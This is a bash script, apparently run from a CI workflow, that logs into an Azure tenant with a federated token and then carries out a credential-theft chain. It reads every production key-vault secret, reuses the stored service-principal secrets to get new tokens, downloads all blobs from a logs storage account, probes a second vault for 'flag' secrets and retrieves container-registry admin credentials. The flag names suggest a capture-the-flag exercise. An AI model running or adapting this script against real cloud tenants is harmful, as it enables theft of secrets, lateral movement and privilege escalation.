#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
GRAPH=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv 2>/dev/null || echo "")

echo "=== LOOK UP UNKNOWN OID 1fe7a412 VIA GRAPH ==="
if [ -n "$GRAPH" ]; then
  curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/1fe7a412-82e9-4135-ab4b-72a0be429adb" \
    -H "Authorization: Bearer $GRAPH"
  echo ""
else
  echo "No graph token"
fi

echo ""
echo "=== ALL SECRETS IN KV PROD (list) ==="
az keyvault secret list --vault-name kv-tbl-prod-x3euoz --output json 2>/dev/null | python3 -c '
import sys,json
secrets=json.load(sys.stdin)
for s in secrets:
    name=s["id"].rsplit("/",1)[-1]
    enabled=s.get("attributes",{}).get("enabled","")
    print(f"  {name} enabled={enabled}")
' 2>/dev/null || echo "list failed"

echo ""
echo "=== READ ALL SECRETS IN KV PROD ==="
for secret in cost-reader-principal directory-audit-principal legacy-admin-principal reporting-viewer-principal secrets-sync-principal reporting-service-principal; do
  VAL=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$secret" 2>/dev/null \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("value","")[:80])' 2>/dev/null)
  echo "  $secret: ${VAL:0:60}"
done

echo ""
echo "=== READ SECRETS-SYNC CREDENTIALS ==="
SS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
SS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
echo "SS_CID: $SS_CID"

SS_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://storage.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "secrets-sync storage token len=${#SS_ST}"

if [ "${#SS_ST}" -gt 100 ]; then
  echo "--- List containers in sttblcilogsprodx3euoz ---"
  CONTAINERS=$(curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" \
    -H "Authorization: Bearer $SS_ST" -H "x-ms-version: 2021-08-06")
  echo "$CONTAINERS" | head -c 3000

  echo ""
  echo "--- List blobs in each container ---"
  python3 << PYEOF
import xml.etree.ElementTree as ET,re,urllib.request,sys

CONTAINERS="""$CONTAINERS"""
tok="$SS_ST"
base="https://sttblcilogsprodx3euoz.blob.core.windows.net"

try:
    root=ET.fromstring(CONTAINERS)
    for c in root.iter("Name"):
        cn=c.text
        if cn:
            print(f"=== Container: {cn} ===")
            req=urllib.request.Request(f"{base}/{cn}?restype=container&comp=list",
                headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
            with urllib.request.urlopen(req,timeout=20) as r:
                body=r.read().decode("utf-8","replace")
            print(body[:2000])
            # Read each blob
            for bn in re.findall(r"<Name>(.*?)</Name>",body):
                req2=urllib.request.Request(f"{base}/{cn}/{bn}",
                    headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
                try:
                    with urllib.request.urlopen(req2,timeout=20) as r2:
                        blob=r2.read().decode("utf-8","replace")
                    print(f"BLOB {cn}/{bn}:")
                    print(blob[:5000])
                except Exception as e:
                    print(f"BLOB {cn}/{bn} ERR: {e}")
except Exception as e:
    print(f"XML parse error: {e}")
PYEOF
fi

echo ""
echo "=== READ COST-READER CREDENTIALS ==="
CR_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name cost-reader-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
CR_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name cost-reader-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
echo "CR_CID: $CR_CID"

CR_OID=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CR_CID" --data-urlencode "client_secret=$CR_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c '
import sys,json,base64
d=json.load(sys.stdin)
t=d.get("access_token","")
if t:
    p=t.split(".")[1]; p+="="*((-len(p))%4)
    c=json.loads(base64.urlsafe_b64decode(p))
    print(c.get("oid",""))
' 2>/dev/null)
echo "cost-reader OID: $CR_OID"

# Check if cost-reader is 1fe7a412
echo "Is 1fe7a412? $([ "$CR_OID" = "1fe7a412-82e9-4135-ab4b-72a0be429adb" ] && echo YES || echo NO)"

echo ""
echo "=== CHECK cost-reader ON KV SEC ==="
CR_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CR_CID" --data-urlencode "client_secret=$CR_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "cost-reader vault token len=${#CR_VT}"

if [ "${#CR_VT}" -gt 100 ]; then
  echo "--- KV sec secrets list ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $CR_VT"
  echo ""
  echo "--- KV sec flag ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
    -H "Authorization: Bearer $CR_VT"
  echo ""
  echo "--- All KV sec secrets (wildcard) ---"
  for name in flag ctf-flag df26 secret main-secret tbl-secret tebamoto; do
    S=$(curl -sS -o /dev/null -w '%{http_code}' \
      "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$name?api-version=7.4" \
      -H "Authorization: Bearer $CR_VT")
    echo "  /secrets/$name: $S"
  done
fi

echo ""
echo "=== CHECK DIRECTORY-AUDIT ON KV SEC ==="
DA_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
DA_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
echo "DA_CID: $DA_CID"

DA_OID=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c '
import sys,json,base64
d=json.load(sys.stdin)
t=d.get("access_token","")
if t:
    p=t.split(".")[1]; p+="="*((-len(p))%4)
    c=json.loads(base64.urlsafe_b64decode(p))
    print(c.get("oid",""))
' 2>/dev/null)
echo "directory-audit OID: $DA_OID"
echo "Is 1fe7a412? $([ "$DA_OID" = "1fe7a412-82e9-4135-ab4b-72a0be429adb" ] && echo YES || echo NO)"

DA_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "directory-audit vault token len=${#DA_VT}"

if [ "${#DA_VT}" -gt 100 ]; then
  echo "--- KV sec secrets list ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $DA_VT"
fi

echo ""
echo "=== CHECK REPORTING-VIEWER ON KV SEC ==="
RV_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-viewer-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RV_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-viewer-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
echo "RV_CID: $RV_CID"

RV_OID=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RV_CID" --data-urlencode "client_secret=$RV_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c '
import sys,json,base64
d=json.load(sys.stdin)
t=d.get("access_token","")
if t:
    p=t.split(".")[1]; p+="="*((-len(p))%4)
    c=json.loads(base64.urlsafe_b64decode(p))
    print(c.get("oid",""))
' 2>/dev/null)
echo "reporting-viewer OID: $RV_OID"
echo "Is 1fe7a412? $([ "$RV_OID" = "1fe7a412-82e9-4135-ab4b-72a0be429adb" ] && echo YES || echo NO)"

RV_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RV_CID" --data-urlencode "client_secret=$RV_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "reporting-viewer vault token len=${#RV_VT}"

if [ "${#RV_VT}" -gt 100 ]; then
  echo "--- KV sec secrets list ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $RV_VT"
fi

echo ""
echo "=== ACR ADMIN CREDENTIALS ==="
ACR_CREDS=$(curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-01-01-preview" \
  -H "Authorization: Bearer $ARM" -H "Content-Length: 0")
echo "ACR creds:"
echo "$ACR_CREDS" | head -c 500

echo ""
echo "DONE"
